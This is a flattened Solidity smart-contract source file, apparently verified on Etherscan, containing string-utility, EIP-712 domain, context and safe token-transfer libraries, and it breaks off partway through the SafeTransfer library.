/**
 *Submitted for verification at Etherscan.io on 2023-08-30
*/

// File: contracts/utils/LibString.sol


pragma solidity ^0.8.4;

/// @notice Library for converting numbers into strings and other string operations.
/// @author SolDAO (https://github.com/Sol-DAO/solbase/blob/main/src/utils/LibString.sol)
/// @author Solady (https://github.com/vectorized/solady/blob/main/src/utils/LibString.sol)
library LibString {
    /// -----------------------------------------------------------------------
    /// Custom Errors
    /// -----------------------------------------------------------------------

    /// @dev The `length` of the output is too small to contain all the hex digits.
    error HexLengthInsufficient();

    /// -----------------------------------------------------------------------
    /// Constants
    /// -----------------------------------------------------------------------

    /// @dev The constant returned when the `search` is not found in the string.
    uint256 internal constant NOT_FOUND = uint256(int256(-1));

    /// -----------------------------------------------------------------------
    /// Decimal Operations
    /// -----------------------------------------------------------------------

    /// @dev Returns the base 10 decimal representation of `value`.
    function toString(uint256 value) internal pure returns (string memory str) {
        assembly {
            // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
            // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
            // We will need 1 word for the trailing zeros padding, 1 word for the length,
            // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
            let m := add(mload(0x40), 0xa0)
            // Update the free memory pointer to allocate.
            mstore(0x40, m)
            // Assign the `str` to the end.
            str := sub(m, 0x20)
            // Zeroize the slot after the string.
            mstore(str, 0)

            // Cache the end of the memory to calculate the length later.
            let end := str

            // We write the string from rightmost digit to leftmost digit.
            // The following is essentially a do-while loop that also handles the zero case.
            // prettier-ignore
            for { let temp := value } 1 {} {
                str := sub(str, 1)
                // Write the character to the pointer.
                // The ASCII index of the '0' character is 48.
                mstore8(str, add(48, mod(temp, 10)))
                // Keep dividing `temp` until zero.
                temp := div(temp, 10)
                // prettier-ignore
                if iszero(temp) { break }
            }

            let length := sub(end, str)
            // Move the pointer 32 bytes leftwards to make room for the length.
            str := sub(str, 0x20)
            // Store the length.
            mstore(str, length)
        }
    }

    /// -----------------------------------------------------------------------
    /// Hexadecimal Operations
    /// -----------------------------------------------------------------------

    /// @dev Returns the hexadecimal representation of `value`,
    /// left-padded to an input length of `length` bytes.
    /// The output is prefixed with "0x" encoded using 2 hexadecimal digits per byte,
    /// giving a total length of `length * 2 + 2` bytes.
    /// Reverts if `length` is too small for the output to contain all the digits.
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory str) {
        assembly {
            let start := mload(0x40)
            // We need 0x20 bytes for the trailing zeros padding, `length * 2` bytes
            // for the digits, 0x02 bytes for the prefix, and 0x20 bytes for the length.
            // We add 0x20 to the total and round down to a multiple of 0x20.
            // (0x20 + 0x20 + 0x02 + 0x20) = 0x62.
            let m := add(start, and(add(shl(1, length), 0x62), not(0x1f)))
            // Allocate the memory.
            mstore(0x40, m)
            // Assign the `str` to the end.
            str := sub(m, 0x20)
            // Zeroize the slot after the string.
            mstore(str, 0)

            // Cache the end to calculate the length later.
            let end := str
            // Store "0123456789abcdef" in scratch space.
            mstore(0x0f, 0x30313233343536373839616263646566)

            let temp := value
            // We write the string from rightmost digit to leftmost digit.
            // The following is essentially a do-while loop that also handles the zero case.
            // prettier-ignore
            for {} 1 {} {
                str := sub(str, 2)
                mstore8(add(str, 1), mload(and(temp, 15)))
                mstore8(str, mload(and(shr(4, temp), 15)))
                temp := shr(8, temp)
                length := sub(length, 1)
                // prettier-ignore
                if iszero(length) { break }
            }

            if temp {
                // Store the function selector of `HexLengthInsufficient()`.
                mstore(0x00, 0x2194895a)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }

            // Compute the string's length.
            let strLength := add(sub(end, str), 2)
            // Move the pointer and write the "0x" prefix.
            str := sub(str, 0x20)
            mstore(str, 0x3078)
            // Move the pointer and write the length.
            str := sub(str, 2)
            mstore(str, strLength)
        }
    }

    /// @dev Returns the hexadecimal representation of `value`.
    /// The output is prefixed with "0x" and encoded using 2 hexadecimal digits per byte.
    /// As address are 20 bytes long, the output will left-padded to have
    /// a length of `20 * 2 + 2` bytes.
    function toHexString(uint256 value) internal pure returns (string memory str) {
        assembly {
            let start := mload(0x40)
            // We need 0x20 bytes for the trailing zeros padding, 0x20 bytes for the length,
            // 0x02 bytes for the prefix, and 0x40 bytes for the digits.
            // The next multiple of 0x20 above (0x20 + 0x20 + 0x02 + 0x40) is 0xa0.
            let m := add(start, 0xa0)
            // Allocate the memory.
            mstore(0x40, m)
            // Assign the `str` to the end.
            str := sub(m, 0x20)
            // Zeroize the slot after the string.
            mstore(str, 0)

            // Cache the end to calculate the length later.
            let end := str
            // Store "0123456789abcdef" in scratch space.
            mstore(0x0f, 0x30313233343536373839616263646566)

            // We write the string from rightmost digit to leftmost digit.
            // The following is essentially a do-while loop that also handles the zero case.
            // prettier-ignore
            for { let temp := value } 1 {} {
                str := sub(str, 2)
                mstore8(add(str, 1), mload(and(temp, 15)))
                mstore8(str, mload(and(shr(4, temp), 15)))
                temp := shr(8, temp)
                // prettier-ignore
                if iszero(temp) { break }
            }

            // Compute the string's length.
            let strLength := add(sub(end, str), 2)
            // Move the pointer and write the "0x" prefix.
            str := sub(str, 0x20)
            mstore(str, 0x3078)
            // Move the pointer and write the length.
            str := sub(str, 2)
            mstore(str, strLength)
        }
    }

    /// @dev Returns the hexadecimal representation of `value`.
    /// The output is prefixed with "0x" and encoded using 2 hexadecimal digits per byte.
    function toHexString(address value) internal pure returns (string memory str) {
        assembly {
            let start := mload(0x40)
            // We need 0x20 bytes for the length, 0x02 bytes for the prefix,
            // and 0x28 bytes for the digits.
            // The next multiple of 0x20 above (0x20 + 0x02 + 0x28) is 0x60.
            str := add(start, 0x60)

            // Allocate the memory.
            mstore(0x40, str)
            // Store "0123456789abcdef" in scratch space.
            mstore(0x0f, 0x30313233343536373839616263646566)

            let length := 20
            // We write the string from rightmost digit to leftmost digit.
            // The following is essentially a do-while loop that also handles the zero case.
            // prettier-ignore
            for { let temp := value } 1 {} {
                str := sub(str, 2)
                mstore8(add(str, 1), mload(and(temp, 15)))
                mstore8(str, mload(and(shr(4, temp), 15)))
                temp := shr(8, temp)
                length := sub(length, 1)
                // prettier-ignore
                if iszero(length) { break }
            }

            // Move the pointer and write the "0x" prefix.
            str := sub(str, 32)
            mstore(str, 0x3078)
            // Move the pointer and write the length.
            str := sub(str, 2)
            mstore(str, 42)
        }
    }

    /// -----------------------------------------------------------------------
    /// Other String Operations
    /// -----------------------------------------------------------------------

    // For performance and bytecode compactness, all indices of the following operations
    // are byte (ASCII) offsets, not UTF character offsets.

    /// @dev Returns `subject` all occurances of `search` replaced with `replacement`.
    function replace(
        string memory subject,
        string memory search,
        string memory replacement
    ) internal pure returns (string memory result) {
        assembly {
            let subjectLength := mload(subject)
            let searchLength := mload(search)
            let replacementLength := mload(replacement)

            subject := add(subject, 0x20)
            search := add(search, 0x20)
            replacement := add(replacement, 0x20)
            result := add(mload(0x40), 0x20)

            let subjectEnd := add(subject, subjectLength)
            if iszero(gt(searchLength, subjectLength)) {
                let subjectSearchEnd := add(sub(subjectEnd, searchLength), 1)
                let h := 0
                if iszero(lt(searchLength, 32)) {
                    h := keccak256(search, searchLength)
                }
                let m := shl(3, sub(32, and(searchLength, 31)))
                let s := mload(search)
                // prettier-ignore
                for {} 1 {} {
                    let t := mload(subject)
                    // Whether the first `searchLength % 32` bytes of 
                    // `subject` and `search` matches.
                    if iszero(shr(m, xor(t, s))) {
                        if h {
                            if iszero(eq(keccak256(subject, searchLength), h)) {
                                mstore(result, t)
                                result := add(result, 1)
                                subject := add(subject, 1)
                                // prettier-ignore
                                if iszero(lt(subject, subjectSearchEnd)) { break }
                                continue
                            }
                        }
                        // Copy the `replacement` one word at a time.
                        // prettier-ignore
                        for { let o := 0 } 1 {} {
                            mstore(add(result, o), mload(add(replacement, o)))
                            o := add(o, 0x20)
                            // prettier-ignore
                            if iszero(lt(o, replacementLength)) { break }
                        }
                        result := add(result, replacementLength)
                        subject := add(subject, searchLength)
                        if searchLength {
                            // prettier-ignore
                            if iszero(lt(subject, subjectSearchEnd)) { break }
                            continue
                        }
                    }
                    mstore(result, t)
                    result := add(result, 1)
                    subject := add(subject, 1)
                    // prettier-ignore
                    if iszero(lt(subject, subjectSearchEnd)) { break }
                }
            }

            let resultRemainder := result
            result := add(mload(0x40), 0x20)
            let k := add(sub(resultRemainder, result), sub(subjectEnd, subject))
            // Copy the rest of the string one word at a time.
            // prettier-ignore
            for {} lt(subject, subjectEnd) {} {
                mstore(resultRemainder, mload(subject))
                resultRemainder := add(resultRemainder, 0x20)
                subject := add(subject, 0x20)
            }
            result := sub(result, 0x20)
            // Zeroize the slot after the string.
            let last := add(add(result, 0x20), k)
            mstore(last, 0)
            // Allocate memory for the length and the bytes,
            // rounded up to a multiple of 32.
            mstore(0x40, and(add(last, 31), not(31)))
            // Store the length of the result.
            mstore(result, k)
        }
    }

    /// @dev Returns the byte index of the first location of `search` in `subject`,
    /// searching from left to right, starting from `from`.
    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
    function indexOf(string memory subject, string memory search, uint256 from) internal pure returns (uint256 result) {
        assembly {
            // prettier-ignore
            for { let subjectLength := mload(subject) } 1 {} {
                if iszero(mload(search)) {
                    // `result = min(from, subjectLength)`.
                    result := xor(from, mul(xor(from, subjectLength), lt(subjectLength, from)))
                    break
                }
                let searchLength := mload(search)
                let subjectStart := add(subject, 0x20)    
                
                result := not(0) // Initialize to `NOT_FOUND`.

                subject := add(subjectStart, from)
                let subjectSearchEnd := add(sub(add(subjectStart, subjectLength), searchLength), 1)

                let m := shl(3, sub(32, and(searchLength, 31)))
                let s := mload(add(search, 0x20))

                // prettier-ignore
                if iszero(lt(subject, subjectSearchEnd)) { break }

                if iszero(lt(searchLength, 32)) {
                    // prettier-ignore
                    for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {
                        if iszero(shr(m, xor(mload(subject), s))) {
                            if eq(keccak256(subject, searchLength), h) {
                                result := sub(subject, subjectStart)
                                break
                            }
                        }
                        subject := add(subject, 1)
                        // prettier-ignore
                        if iszero(lt(subject, subjectSearchEnd)) { break }
                    }
                    break
                }
                // prettier-ignore
                for {} 1 {} {
                    if iszero(shr(m, xor(mload(subject), s))) {
                        result := sub(subject, subjectStart)
                        break
                    }
                    subject := add(subject, 1)
                    // prettier-ignore
                    if iszero(lt(subject, subjectSearchEnd)) { break }
                }
                break
            }
        }
    }

    /// @dev Returns the byte index of the first location of `search` in `subject`,
    /// searching from left to right.
    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
    function indexOf(string memory subject, string memory search) internal pure returns (uint256 result) {
        result = indexOf(subject, search, 0);
    }

    /// @dev Returns the byte index of the first location of `search` in `subject`,
    /// searching from right to left, starting from `from`.
    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
    function lastIndexOf(
        string memory subject,
        string memory search,
        uint256 from
    ) internal pure returns (uint256 result) {
        assembly {
            // prettier-ignore
            for {} 1 {} {
                let searchLength := mload(search)
                let fromMax := sub(mload(subject), searchLength)
                if iszero(gt(fromMax, from)) {
                    from := fromMax
                }
                if iszero(mload(search)) {
                    result := from
                    break
                }
                result := not(0) // Initialize to `NOT_FOUND`.

                let subjectSearchEnd := sub(add(subject, 0x20), 1)

                subject := add(add(subject, 0x20), from)
                // prettier-ignore
                if iszero(gt(subject, subjectSearchEnd)) { break }
                // As this function is not too often used,
                // we shall simply use keccak256 for smaller bytecode size.
                // prettier-ignore
                for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {
                    if eq(keccak256(subject, searchLength), h) {
                        result := sub(subject, add(subjectSearchEnd, 1))
                        break
                    }
                    subject := sub(subject, 1)
                    // prettier-ignore
                    if iszero(gt(subject, subjectSearchEnd)) { break }
                }
                break
            }
        }
    }

    /// @dev Returns the index of the first location of `search` in `subject`,
    /// searching from right to left.
    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.
    function lastIndexOf(string memory subject, string memory search) internal pure returns (uint256 result) {
        result = lastIndexOf(subject, search, uint256(int256(-1)));
    }

    /// @dev Returns whether `subject` starts with `search`.
    function startsWith(string memory subject, string memory search) internal pure returns (bool result) {
        assembly {
            let searchLength := mload(search)
            // Just using keccak256 directly is actually cheaper.
            result := and(
                iszero(gt(searchLength, mload(subject))),
                eq(keccak256(add(subject, 0x20), searchLength), keccak256(add(search, 0x20), searchLength))
            )
        }
    }

    /// @dev Returns whether `subject` ends with `search`.
    function endsWith(string memory subject, string memory search) internal pure returns (bool result) {
        assembly {
            let searchLength := mload(search)
            let subjectLength := mload(subject)
            // Whether `search` is not longer than `subject`.
            let withinRange := iszero(gt(searchLength, subjectLength))
            // Just using keccak256 directly is actually cheaper.
            result := and(
                withinRange,
                eq(
                    keccak256(
                        // `subject + 0x20 + max(subjectLength - searchLength, 0)`.
                        add(add(subject, 0x20), mul(withinRange, sub(subjectLength, searchLength))),
                        searchLength
                    ),
                    keccak256(add(search, 0x20), searchLength)
                )
            )
        }
    }

    /// @dev Returns `subject` repeated `times`.
    function repeat(string memory subject, uint256 times) internal pure returns (string memory result) {
        assembly {
            let subjectLength := mload(subject)
            if iszero(or(iszero(times), iszero(subjectLength))) {
                subject := add(subject, 0x20)
                result := mload(0x40)
                let output := add(result, 0x20)
                // prettier-ignore
                for {} 1 {} {
                    // Copy the `subject` one word at a time.
                    // prettier-ignore
                    for { let o := 0 } 1 {} {
                        mstore(add(output, o), mload(add(subject, o)))
                        o := add(o, 0x20)
                        // prettier-ignore
                        if iszero(lt(o, subjectLength)) { break }
                    }
                    output := add(output, subjectLength)
                    times := sub(times, 1)
                    // prettier-ignore
                    if iszero(times) { break }
                }
                // Zeroize the slot after the string.
                mstore(output, 0)
                // Store the length.
                let resultLength := sub(output, add(result, 0x20))
                mstore(result, resultLength)
                // Allocate memory for the length and the bytes,
                // rounded up to a multiple of 32.
                mstore(0x40, add(result, and(add(resultLength, 63), not(31))))
            }
        }
    }

    /// @dev Returns a copy of `subject` sliced from `start` to `end` (exclusive).
    /// `start` and `end` are byte offsets.
    function slice(string memory subject, uint256 start, uint256 end) internal pure returns (string memory result) {
        assembly {
            let subjectLength := mload(subject)
            if iszero(gt(subjectLength, end)) {
                end := subjectLength
            }
            if iszero(gt(subjectLength, start)) {
                start := subjectLength
            }
            if lt(start, end) {
                result := mload(0x40)
                let resultLength := sub(end, start)
                mstore(result, resultLength)
                subject := add(subject, start)
                // Copy the `subject` one word at a time, backwards.
                // prettier-ignore
                for { let o := and(add(resultLength, 31), not(31)) } 1 {} {
                    mstore(add(result, o), mload(add(subject, o)))
                    o := sub(o, 0x20)
                    // prettier-ignore
                    if iszero(o) { break }
                }
                // Zeroize the slot after the string.
                mstore(add(add(result, 0x20), resultLength), 0)
                // Allocate memory for the length and the bytes,
                // rounded up to a multiple of 32.
                mstore(0x40, add(result, and(add(resultLength, 63), not(31))))
            }
        }
    }

    /// @dev Returns a copy of `subject` sliced from `start` to the end of the string.
    /// `start` is a byte offset.
    function slice(string memory subject, uint256 start) internal pure returns (string memory result) {
        result = slice(subject, start, uint256(int256(-1)));
    }

    /// @dev Returns all the indices of `search` in `subject`.
    /// The indices are byte offsets.
    function indicesOf(string memory subject, string memory search) internal pure returns (uint256[] memory result) {
        assembly {
            let subjectLength := mload(subject)
            let searchLength := mload(search)

            if iszero(gt(searchLength, subjectLength)) {
                subject := add(subject, 0x20)
                search := add(search, 0x20)
                result := add(mload(0x40), 0x20)

                let subjectStart := subject
                let subjectSearchEnd := add(sub(add(subject, subjectLength), searchLength), 1)
                let h := 0
                if iszero(lt(searchLength, 32)) {
                    h := keccak256(search, searchLength)
                }
                let m := shl(3, sub(32, and(searchLength, 31)))
                let s := mload(search)
                // prettier-ignore
                for {} 1 {} {
                    let t := mload(subject)
                    // Whether the first `searchLength % 32` bytes of 
                    // `subject` and `search` matches.
                    if iszero(shr(m, xor(t, s))) {
                        if h {
                            if iszero(eq(keccak256(subject, searchLength), h)) {
                                subject := add(subject, 1)
                                // prettier-ignore
                                if iszero(lt(subject, subjectSearchEnd)) { break }
                                continue
                            }
                        }
                        // Append to `result`.
                        mstore(result, sub(subject, subjectStart))
                        result := add(result, 0x20)
                        // Advance `subject` by `searchLength`.
                        subject := add(subject, searchLength)
                        if searchLength {
                            // prettier-ignore
                            if iszero(lt(subject, subjectSearchEnd)) { break }
                            continue
                        }
                    }
                    subject := add(subject, 1)
                    // prettier-ignore
                    if iszero(lt(subject, subjectSearchEnd)) { break }
                }
                let resultEnd := result
                // Assign `result` to the free memory pointer.
                result := mload(0x40)
                // Store the length of `result`.
                mstore(result, shr(5, sub(resultEnd, add(result, 0x20))))
                // Allocate memory for result.
                // We allocate one more word, so this array can be recycled for {split}.
                mstore(0x40, add(resultEnd, 0x20))
            }
        }
    }

    /// @dev Returns a arrays of strings based on the `delimiter` inside of the `subject` string.
    function split(string memory subject, string memory delimiter) internal pure returns (string[] memory result) {
        uint256[] memory indices = indicesOf(subject, delimiter);
        assembly {
            if mload(indices) {
                let indexPtr := add(indices, 0x20)
                let indicesEnd := add(indexPtr, shl(5, add(mload(indices), 1)))
                mstore(sub(indicesEnd, 0x20), mload(subject))
                mstore(indices, add(mload(indices), 1))
                let prevIndex := 0
                // prettier-ignore
                for {} 1 {} {
                    let index := mload(indexPtr)
                    mstore(indexPtr, 0x60)                        
                    if iszero(eq(index, prevIndex)) {
                        let element := mload(0x40)
                        let elementLength := sub(index, prevIndex)
                        mstore(element, elementLength)
                        // Copy the `subject` one word at a time, backwards.
                        // prettier-ignore
                        for { let o := and(add(elementLength, 31), not(31)) } 1 {} {
                            mstore(add(element, o), mload(add(add(subject, prevIndex), o)))
                            o := sub(o, 0x20)
                            // prettier-ignore
                            if iszero(o) { break }
                        }
                        // Zeroize the slot after the string.
                        mstore(add(add(element, 0x20), elementLength), 0)
                        // Allocate memory for the length and the bytes,
                        // rounded up to a multiple of 32.
                        mstore(0x40, add(element, and(add(elementLength, 63), not(31))))
                        // Store the `element` into the array.
                        mstore(indexPtr, element)                        
                    }
                    prevIndex := add(index, mload(delimiter))
                    indexPtr := add(indexPtr, 0x20)
                    // prettier-ignore
                    if iszero(lt(indexPtr, indicesEnd)) { break }
                }
                result := indices
                if iszero(mload(delimiter)) {
                    result := add(indices, 0x20)
                    mstore(result, sub(mload(indices), 2))
                }
            }
        }
    }

    /// @dev Returns a concatenated string of `a` and `b`.
    /// Cheaper than `string.concat()` and does not de-align the free memory pointer.
    function concat(string memory a, string memory b) internal pure returns (string memory result) {
        assembly {
            result := mload(0x40)
            let aLength := mload(a)
            // Copy `a` one word at a time, backwards.
            // prettier-ignore
            for { let o := and(add(mload(a), 32), not(31)) } 1 {} {
                mstore(add(result, o), mload(add(a, o)))
                o := sub(o, 0x20)
                // prettier-ignore
                if iszero(o) { break }
            }
            let bLength := mload(b)
            let output := add(result, mload(a))
            // Copy `b` one word at a time, backwards.
            // prettier-ignore
            for { let o := and(add(bLength, 32), not(31)) } 1 {} {
                mstore(add(output, o), mload(add(b, o)))
                o := sub(o, 0x20)
                // prettier-ignore
                if iszero(o) { break }
            }
            let totalLength := add(aLength, bLength)
            let last := add(add(result, 0x20), totalLength)
            // Zeroize the slot after the string.
            mstore(last, 0)
            // Stores the length.
            mstore(result, totalLength)
            // Allocate memory for the length and the bytes,
            // rounded up to a multiple of 32.
            mstore(0x40, and(add(last, 31), not(31)))
        }
    }

    /// @dev Packs a single string with its length into a single word.
    /// Returns `bytes32(0)` if the length is zero or greater than 31.
    function packOne(string memory a) internal pure returns (bytes32 result) {
        assembly {
            // We don't need to zero right pad the string,
            // since this is our own custom non-standard packing scheme.
            result := mul(
                // Load the length and the bytes.
                mload(add(a, 0x1f)),
                // `length != 0 && length < 32`. Abuses underflow.
                // Assumes that the length is valid and within the block gas limit.
                lt(sub(mload(a), 1), 0x1f)
            )
        }
    }

    /// @dev Unpacks a string packed using {packOne}.
    /// Returns the empty string if `packed` is `bytes32(0)`.
    /// If `packed` is not an output of {packOne}, the output behaviour is undefined.
    function unpackOne(bytes32 packed) internal pure returns (string memory result) {
        assembly {
            // Grab the free memory pointer.
            result := mload(0x40)
            // Allocate 2 words (1 for the length, 1 for the bytes).
            mstore(0x40, add(result, 0x40))
            // Zeroize the length slot.
            mstore(result, 0)
            // Store the length and bytes.
            mstore(add(result, 0x1f), packed)
            // Right pad with zeroes.
            mstore(add(add(result, 0x20), mload(result)), 0)
        }
    }

    /// @dev Packs two strings with their lengths into a single word.
    /// Returns `bytes32(0)` if combined length is zero or greater than 30.
    function packTwo(string memory a, string memory b) internal pure returns (bytes32 result) {
        assembly {
            let aLength := mload(a)
            // We don't need to zero right pad the strings,
            // since this is our own custom non-standard packing scheme.
            result := mul(
                // Load the length and the bytes of `a` and `b`.
                or(shl(shl(3, sub(0x1f, aLength)), mload(add(a, aLength))), mload(sub(add(b, 0x1e), aLength))),
                // `totalLength != 0 && totalLength < 31`. Abuses underflow.
                // Assumes that the lengths are valid and within the block gas limit.
                lt(sub(add(aLength, mload(b)), 1), 0x1e)
            )
        }
    }

    /// @dev Unpacks strings packed using {packTwo}.
    /// Returns the empty strings if `packed` is `bytes32(0)`.
    /// If `packed` is not an output of {packTwo}, the output behaviour is undefined.
    function unpackTwo(bytes32 packed) internal pure returns (string memory resultA, string memory resultB) {
        assembly {
            // Grab the free memory pointer.
            resultA := mload(0x40)
            resultB := add(resultA, 0x40)
            // Allocate 2 words for each string (1 for the length, 1 for the byte). Total 4 words.
            mstore(0x40, add(resultB, 0x40))
            // Zeroize the length slots.
            mstore(resultA, 0)
            mstore(resultB, 0)
            // Store the lengths and bytes.
            mstore(add(resultA, 0x1f), packed)
            mstore(add(resultB, 0x1f), mload(add(add(resultA, 0x20), mload(resultA))))
            // Right pad with zeroes.
            mstore(add(add(resultA, 0x20), mload(resultA)), 0)
            mstore(add(add(resultB, 0x20), mload(resultB)), 0)
        }
    }

    /// @dev Directly returns `a` without copying.
    function directReturn(string memory a) internal pure {
        assembly {
            // Right pad with zeroes. Just in case the string is produced
            // by a method that doesn't zero right pad.
            mstore(add(add(a, 0x20), mload(a)), 0)
            // Store the return offset.
            // Assumes that the string does not start from the scratch space.
            mstore(sub(a, 0x20), 0x20)
            // End the transaction, returning the string.
            return(sub(a, 0x20), add(mload(a), 0x40))
        }
    }
}
// File: contracts/interfaces/IERC5267.sol


// OpenZeppelin Contracts (last updated v4.9.0) (interfaces/IERC5267.sol)

pragma solidity ^0.8.19;

interface IERC5267 {
    /**
     * @dev MAY be emitted to signal that the domain could have changed.
     */
    event EIP712DomainChanged();

    /**
     * @dev returns the fields and values that describe the domain separator used by this contract for EIP-712
     * signature.
     */
    function eip712Domain()
        external
        view
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        );
}
// File: contracts/abstracts/EIP712.sol


pragma solidity ^0.8.19;



abstract contract EIP712 is IERC5267 {

    using LibString for *;

    bytes32 internal constant DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;

    bytes32 internal immutable DOMAIN_NAME;
    bytes32 internal immutable HASHED_DOMAIN_NAME;

    bytes32 internal immutable DOMAIN_VERSION;
    bytes32 internal immutable HASHED_DOMAIN_VERSION;

    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;

    uint256 internal immutable INITIAL_CHAIN_ID;

    constructor(string memory domainName, string memory version) {
        DOMAIN_NAME = domainName.packOne();
        HASHED_DOMAIN_NAME = keccak256(bytes(domainName));
        DOMAIN_VERSION = version.packOne();
        HASHED_DOMAIN_VERSION = keccak256(bytes(version));
        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
        INITIAL_CHAIN_ID = block.chainid;
    }

    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
    }

    function eip712Domain()
        public
        view
        virtual
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        )
    {
        return (
            hex"0f",
            DOMAIN_NAME.unpackOne(),
            DOMAIN_VERSION.unpackOne(),
            block.chainid,
            address(this),
            bytes32(0),
            new uint256[](0)
        );
    }

    function computeDomainSeparator() internal view virtual returns (bytes32) {
        return
            keccak256(
                abi.encode(DOMAIN_TYPEHASH, HASHED_DOMAIN_NAME, HASHED_DOMAIN_VERSION, block.chainid, address(this))
            );
    }

    function computeDigest(bytes32 hashStruct) internal view virtual returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(), hashStruct));
    }
}
// File: contracts/abstracts/Context.sol



pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _msgValue() internal view virtual returns(uint256) {
        return msg.value;
    }
}
// File: contracts/utils/SafeTransfer.sol


pragma solidity ^0.8.4;

/// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.
/// @author SolDAO (https://github.com/Sol-DAO/solbase/blob/main/src/utils/SafeTransferLib.sol)
/// @author Modified from Solady (https://github.com/vectorized/solady/blob/main/src/utils/SafeTransferLib.sol)
/// @dev Caution! This library won't check that a token has code, responsibility is delegated to the caller.
library SafeTransfer {
    /// -----------------------------------------------------------------------
    /// Custom Errors
    /// -----------------------------------------------------------------------

    /// @dev The ETH transfer has failed.
    error ETHTransferFailed();

    /// @dev The ERC20 `approve` has failed.
    error ApproveFailed();

    /// @dev The ERC20 `transfer` has failed.
    error TransferFailed();

    /// @dev The ERC20 `burn` has failed.
    error BurnFailed();

    /// @dev The ERC20 `transferFrom` has failed.
    error TransferFromFailed();

    /// -----------------------------------------------------------------------
    /// ETH Operations
    /// -----------------------------------------------------------------------

    /// @dev Sends `amount` (in wei) ETH to `to`.
    /// Reverts upon failure.
    function safeTransferETH(address to, uint256 amount) internal {
        /// @solidity memory-safe-assembly
        assembly {
            // Transfer the ETH and check if it succeeded or not.
            if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {
                // Store the function selector of `ETHTransferFailed()`.
                mstore(0x00, 0xb12d13eb)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }
        }
    }

    /// -----------------------------------------------------------------------
    /// ERC20 Operations
    /// -----------------------------------------------------------------------

    /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.
    /// Reverts upon failure.
    function safeApprove(address token, address to, uint256 amount) internal {
        /// @solidity memory-safe-assembly
        assembly {
            // We'll write our calldata to this slot below, but restore it later.
            let memPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(0x00, 0x095ea7b3)
            mstore(0x20, to) // Append the "to" argument.
            mstore(0x40, amount) // Append the "amount" argument.

            if iszero(
                and(
                    // Set success to whether the call reverted, if not we check it either
                    // returned exactly 1 (can't just be non-zero data), or had no return data.
                    or(eq(mload(0x00), 1), iszero(returndatasize())),
                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)
                    // Counterintuitively, this call() must be positioned after the or() in the
                    // surrounding and() because and() evaluates its arguments from right to left.
                    call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)
                )
            ) {
                // Store the function selector of `ApproveFailed()`.
                mstore(0x00, 0x3e3f8f73)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }

            mstore(0x40, memPointer) // Restore the memPointer.
        }
    }

    /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.
    /// Reverts upon failure.
    function safeTransfer(address token, address to, uint256 amount) internal {
        /// @solidity memory-safe-assembly
        assembly {
            // We'll write our calldata to this slot below, but restore it later.
            let memPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(0x00, 0xa9059cbb)
            mstore(0x20, to) // Append the "to" argument.
            mstore(0x40, amount) // Append the "amount" argument.

            if iszero(
                and(
                    // Set success to whether the call reverted, if not we check it either
                    // returned exactly 1 (can't just be non-zero data), or had no return data.
                    or(eq(mload(0x00), 1), iszero(returndatasize())),
                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)
                    // Counterintuitively, this call() must be positioned after the or() in the
                    // surrounding and() because and() evaluates its arguments from right to left.
                    call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)
                )
            ) {
                // Store the function selector of `TransferFailed()`.
                mstore(0x00, 0x90b8ec18)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }

            mstore(0x40, memPointer) // Restore the memPointer.
        }
    }

    function safeBurn(address token, uint256 amount) internal {
        /// @solidity memory-safe-assembly
        assembly {
            // We'll write our calldata to this slot below, but restore it later.
            let memPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(0x00, 0x42966c68)
            mstore(0x20, amount) // Append the "amount" argument.

            if iszero(
                and(
                    // Set success to whether the call reverted, if not we check it either
                    // returned exactly 1 (can't just be non-zero data), or had no return data.
                    or(eq(mload(0x00), 1), iszero(returndatasize())),
                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 1)
                    // Counterintuitively, this call() must be positioned after the or() in the
                    // surrounding and() because and() evaluates its arguments from right to left.
                    call(gas(), token, 0, 0x1c, 0x24, 0x00, 0x20)
                )
            ) {
                // Store the function selector of `BurnFailed()`.
                mstore(0x00, 0x6f16aafc)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }

            mstore(0x40, memPointer) // Restore the memPointer.
        }
    }    

